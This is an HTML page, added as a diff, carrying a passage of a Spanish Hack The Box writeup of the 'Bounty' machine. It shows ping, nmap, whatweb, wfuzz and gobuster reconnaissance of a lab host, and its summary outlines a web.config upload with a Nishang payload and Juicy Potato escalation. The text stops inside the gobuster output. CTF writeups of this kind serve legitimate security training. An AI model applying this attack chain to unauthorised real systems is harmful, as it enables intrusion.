@@ -1,0 +1,1285 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bounty - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-bounty/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Bounty - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-bounty/bounty_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-delivery/">
+          <span class="side-post-card-title">Delivery</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-active/">
+          <span class="side-post-card-title">Active</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Bounty</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-valentine/">
+          <span class="side-post-card-title">Valentine</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-nibbles/">
+          <span class="side-post-card-title">Nibbles</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Bounty - Hack The Box</h1>
+    <div class="post-meta">24 April 2023 · 15 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-bounty/bounty_logo.png" alt="Bounty - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta es una máquina algo sencilla, vamos a usar Fuzzing a la página web que está activa en el puerto HTTP, como no descubrimos nada, buscaremos por archivos ASP, pues usa el servicio IIS y encontraremos una página para subir archivos. Utilizaremos BurpSuite para descubrir que archivos acepta, que en este caso serán los .config, usaremos un archivo web.config para cargar un Payload de Nishang .ps1, con esto accederemos a la máquina como usuarios. Para escalar privilegios, usaremos Juicy Potato, pues tiene los privilegios necesarios para utilizarlo.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>wappalizer</code></li><li><code>whatweb</code></li><li><code>wfuzz</code></li><li><code>gobuster</code></li><li><code>burpsuite</code></li><li><code>python</code></li><li><code>nc</code></li><li><code>grep</code></li><li><code>wget</code></li><li><code>dir</code></li><li><code>whoami</code></li><li><code>systeminfo</code></li><li><code>locate</code></li><li><code>certutil.exe</code></li><li><code>juicy potato</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Attack">Realizando un Ataque Sniper con BurpSuite</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Buscando un Exploit para Servicio IIS</a>
+          <ul>
+            <li><a href="#Exploit2">Probando Archivo web.config Modificado</a></li>
+          </ul>
+        </li>
+        <li><a href="#Exploit3">Probando Archivo web.config Malicioso y Ganando Acceso a la Máquina</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Enum">Enumeración de Máquina Víctima</a></li>
+        <li><a href="#Juicy">Usando el Juicy Potato</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#Fuzz">Fuzzing</a></li>
+        <li><a href="#Attack">Realizando un Ataque Sniper con BurpSuite</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Exploit">Buscando un Exploit para Servicio IIS</a>
+          <ul>
+            <li><a href="#Exploit2">Probando Archivo web.config Modificado</a></li>
+          </ul>
+        </li>
+        <li><a href="#Exploit3">Probando Archivo web.config Malicioso y Ganando Acceso a la Máquina</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Enum">Enumeración de Máquina Víctima</a></li>
+        <li><a href="#Juicy">Usando el Juicy Potato</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.10.93
+</span></span><span style="display:flex;"><span>PING 10.10.10.93 <span style="color:#f92672">(</span>10.10.10.93<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.93: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.93: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.93: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">131</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.93: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">132</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.10.93 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3008ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 130.590/131.044/131.829/0.481 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa Windows, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.93 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-24 14:51 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 14:51
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.93 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.10.93
+</span></span><span style="display:flex;"><span>Increasing send delay <span style="color:#66d9ef">for</span> 10.10.10.93 from <span style="color:#ae81ff">0</span> to <span style="color:#ae81ff">5</span> due to <span style="color:#ae81ff">11</span> out of <span style="color:#ae81ff">18</span> dropped probes since last increase.
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 14:52, 29.73s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.93
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>0.76s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-04-24 14:51:40 CST <span style="color:#66d9ef">for</span> 30s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 29.81 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">131087</span> <span style="color:#f92672">(</span>5.768MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">22</span> <span style="color:#f92672">(</span>956B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Solo veo un puerto abierto, hagamos el escaneo de servicios.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p80 10.10.10.93 -oN targeted                            
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-04-24 14:53 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.93
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Microsoft IIS httpd 7.5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
+</span></span><span style="display:flex;"><span>|_http-title: Bounty
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 13.03 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Veo el servicio <strong>IIS</strong> operando en el puerto HTTP que ya hemos hackeado en otras máquinas. Revisemos ese puerto.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Bien, entremos.</p>
+<p><img src="/assets/images/htb-writeup-bounty/Captura1.png" alt=""></p>
+<p>Solamente hay una imagen, veamos que nos dice <strong>Wappalizer</strong>.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-bounty/Captura2.png">
+</p>
+<p>Ok, ya sabemos que nos enfrentamos al servicio <strong>IIS</strong>, veamos si <strong>whatweb</strong> nos muestra algo distinto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.10.10.93
+</span></span><span style="display:flex;"><span>http://10.10.10.93 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>Microsoft-IIS/7.5<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.10.93<span style="color:#f92672">]</span>, Microsoft-IIS<span style="color:#f92672">[</span>7.5<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Bounty<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>ASP.NET<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Nada nuevo, cuando nos enfrentamos al <strong>servicio IIS</strong>, recordemos que utiliza <strong>ASP.NET</strong> lo cual indica que pueden existir archivos <strong>ASP o ASPX</strong> dentro de este servicio.</p>
+<p>Vamos a aplicar <strong>Fuzzing</strong> enfocado a que busque estos archivos.</p>
+<h3 id="Fuzz">Fuzzing</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wfuzz -c --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> -t <span style="color:#ae81ff">200</span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,asp-aspx http://10.10.10.93/FUZZ.FUZ2Z
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.10.93/FUZZ.FUZ2Z
+</span></span><span style="display:flex;"><span>Total requests: 441092
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000007538:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">21</span> L     <span style="color:#ae81ff">58</span> W       <span style="color:#ae81ff">941</span> Ch      <span style="color:#e6db74">&#34;transfer - aspx&#34;</span>                                                                                                                                                         
+</span></span><span style="display:flex;"><span>000013980:   <span style="color:#ae81ff">400</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">11</span> Ch       <span style="color:#e6db74">&#34;*checkout* - aspx&#34;</span>                                                                                                                                                       
+</span></span><span style="display:flex;"><span>000032798:   <span style="color:#ae81ff">400</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">11</span> Ch       <span style="color:#e6db74">&#34;* - aspx&#34;</span>                                                                                                                                                                
+</span></span><span style="display:flex;"><span>000045914:   <span style="color:#ae81ff">400</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">11</span> Ch       <span style="color:#e6db74">&#34;http%3A%2F%2Fwww - aspx&#34;</span>                                                                                                                                                 
+</span></span><span style="display:flex;"><span>000063706:   <span style="color:#ae81ff">400</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">11</span> Ch       <span style="color:#e6db74">&#34;http%3A - aspx&#34;</span>                                                                                                                                                          
+</span></span><span style="display:flex;"><span>000070528:   <span style="color:#ae81ff">400</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">11</span> Ch       <span style="color:#e6db74">&#34;q%26a - aspx&#34;</span>                                                                                                                                                            
+</span></span><span style="display:flex;"><span>000071290:   <span style="color:#ae81ff">400</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">11</span> Ch       <span style="color:#e6db74">&#34;**http%3a - aspx&#34;</span>                                                                                                                                                        
+</span></span><span style="display:flex;"><span>000030898:   <span style="color:#ae81ff">400</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">11</span> Ch       <span style="color:#e6db74">&#34;*docroot* - aspx&#34;</span>                                                                                                                                                        
+</span></span><span style="display:flex;"><span>000078386:   <span style="color:#ae81ff">400</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">2</span> W        <span style="color:#ae81ff">11</span> Ch       <span style="color:#e6db74">&#34;*http%3A - aspx&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-c</em></td>
+					<td>Para ver el resultado en un formato colorido.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;hc</em></td>
+					<td>Para no mostrar un código de estado en los resultados.</td>
+			</tr>
+			<tr>
+					<td><em>-t</em></td>
+					<td>Para indicar la cantidad de hilos a usar.</td>
+			</tr>
+			<tr>
+					<td><em>-w</em></td>
+					<td>Para indicar el diccionario a usar en el fuzzing.</td>
+			</tr>
+			<tr>
+					<td><em>-z</em></td>
+					<td>Para indicar el uso de una lista de extensiones de archivos a buscar.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora probemos con <strong>gobuster</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.10.93/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">20</span> -x asp,aspx
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.5
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.10.10.93/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.5
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              aspx,asp
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/transfer.aspx        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 941<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/*checkout*.aspx      <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/*docroot*.aspx       <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/*.aspx               <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/UploadedFiles        <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 156<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.93/UploadedFiles/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/*http%3A.aspx        <span style="color:#f92672">(</span>Status: 400<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 11<span style="color:#f92672">]</span>
